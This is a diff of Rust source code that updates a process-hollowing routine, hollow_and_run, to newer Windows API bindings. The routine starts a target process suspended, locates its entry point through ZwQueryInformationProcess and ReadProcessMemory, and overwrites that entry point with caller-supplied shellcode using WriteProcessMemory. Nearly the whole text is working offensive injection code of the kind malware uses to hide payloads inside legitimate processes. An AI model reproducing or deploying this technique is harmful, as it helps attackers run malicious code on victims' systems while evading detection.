@@ -26,8 +26,8 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
         CreateProcessA(
             PCSTR::null(),
             lp_command_line,
-            ptr::null(),
-            ptr::null(),
+            None,
+            None,
             false,
             CREATE_SUSPENDED,
             ptr::null(),
@@ -51,7 +51,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
             PROCESSINFOCLASS::default(),
             &mut basic_information as *mut _ as *mut c_void,
             POINTER_SIZE_TIMES_SIX,
-            ptr::null_mut(),
+            &mut 0_u32,
         )
     } {
         panic!("Could not get the entry point with ZwQueryInformationProcess: {error}");
@@ -66,9 +66,8 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
         ReadProcessMemory(
             process_handle,
             image_base_address as *const c_void,
-            address_buffer.as_mut_ptr() as *mut c_void,
-            address_buffer.len(),
-            ptr::null_mut(),
+            &mut address_buffer,
+            None,
         )
     };
     if !read_result.as_bool() {
@@ -83,9 +82,8 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
         ReadProcessMemory(
             process_handle,
             pe_base_address as *const c_void,
-            header_buffer.as_mut_ptr() as *mut c_void,
-            header_buffer.len(),
-            ptr::null_mut(),
+            &mut header_buffer,
+            None,
         )
     };
     if !read_result.as_bool() {
@@ -105,9 +103,8 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
         WriteProcessMemory(
             process_handle,
             entry_point_address as *const c_void,
-            shellcode.as_ptr() as *const c_void,
-            shellcode.len(),
-            ptr::null_mut(),
+            shellcode,
+            None,
         )
     };
     if !write_result.as_bool() {
